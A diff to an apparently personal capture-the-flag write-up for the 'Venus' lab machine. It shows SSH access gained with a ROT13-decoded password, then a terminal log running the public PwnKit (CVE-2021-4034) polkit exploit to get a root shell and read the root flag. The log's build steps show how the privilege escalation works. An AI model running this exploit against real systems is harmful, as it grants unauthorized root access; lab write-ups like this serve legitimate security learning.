@@ -73,5 +73,65 @@ And now when I used to login into the Magellan, then I got the answer as :
 And on decoding it I get : `magellan:irahfvnatrbybtl1989` So I would be trying to ROT13 Decrypt it and use that as the password for the SSH i.e `venusiangeology1989` and I got logged into the SSH.
 ![[Pasted image 20251203132945.png]]
 
+Then there we found a vulnerable file present naming `polkit` and found that we code shift to root shell and then we ran the exploit and gained the shell and found the root_flag.
 
 
+```
+[magellan@venus ~]$ ls
+CVE-2021-4034-main  CVE-2021-4034-main.zip  user_flag.txt  venus_monitor_proj
+[magellan@venus ~]$ cd CVE-2021-4034-main/
+[magellan@venus CVE-2021-4034-main]$ ls
+cve-2021-4034.c  cve-2021-4034.sh  dry-run  LICENSE  Makefile  pwnkit.c  README.md
+[magellan@venus CVE-2021-4034-main]$ ./cve-2021-4034.sh 
+cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
+cc -Wall    cve-2021-4034.c   -o cve-2021-4034
+echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
+mkdir -p GCONV_PATH=.
+cp -f /usr/bin/true GCONV_PATH=./pwnkit.so:.
+sh-5.1# whoami
+root
+sh-5.1# ls
+'GCONV_PATH=.'   LICENSE   Makefile   README.md   cve-2021-4034   cve-2021-4034.c   cve-2021-4034.sh   dry-run   gconv-modules   pwnkit.c   pwnkit.so
+sh-5.1# pwd    
+/home/magellan/CVE-2021-4034-main
+sh-5.1# cd
+sh: cd: HOME not set
+sh-5.1# cd ..
+sh-5.1# cd ..
+sh-5.1# ls
+magellan  venus
+sh-5.1# cd ..
+sh-5.1# cd root
+sh-5.1# ls
+anaconda-ks.cfg  root_flag.txt
+sh-5.1# cat root_flag.txt 
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@/##////////@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@(((/(*(/((((((////////&@@@@@@@@@@@@@
+@@@@@@@@@@@((#(#(###((##//(((/(/(((*((//@@@@@@@@@@
+@@@@@@@@/#(((#((((((/(/,*/(((///////(/*/*/#@@@@@@@
+@@@@@@*((####((///*//(///*(/*//((/(((//**/((&@@@@@
+@@@@@/(/(((##/*((//(#(////(((((/(///(((((///(*@@@@
+@@@@/(//((((#(((((*///*/(/(/(((/((////(/*/*(///@@@
+@@@//**/(/(#(#(##((/(((((/(**//////////((//((*/#@@
+@@@(//(/((((((#((((#*/((///((///((//////(/(/(*(/@@
+@@@((//((((/((((#(/(/((/(/(((((#((((((/(/((/////@@
+@@@(((/(((/##((#((/*///((/((/((##((/(/(/((((((/*@@
+@@@(((/(##/#(((##((/((((((/(##(/##(#((/((((#((*%@@
+@@@@(///(#(((((#(#(((((#(//((#((###((/(((((/(//@@@
+@@@@@(/*/(##(/(###(((#((((/((####/((((///((((/@@@@
+@@@@@@%//((((#############((((/((/(/(*/(((((@@@@@@
+@@@@@@@@%#(((############(##((#((*//(/(*//@@@@@@@@
+@@@@@@@@@@@/(#(####(###/((((((#(///((//(@@@@@@@@@@
+@@@@@@@@@@@@@@@(((###((#(#(((/((///*@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@%#(#%@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+Congratulations on completing Venus!!!
+If you have any feedback please contact me at SirFlash@protonmail.com
+[root_flag_83588a17919eba10e20aad15081346af]
+sh-5.1# cd ..    
+sh-5.1# cd /home/venus/
+sh-5.1# ls
+venus_remote_read_exploit.py  venusmessage.service
+
+```
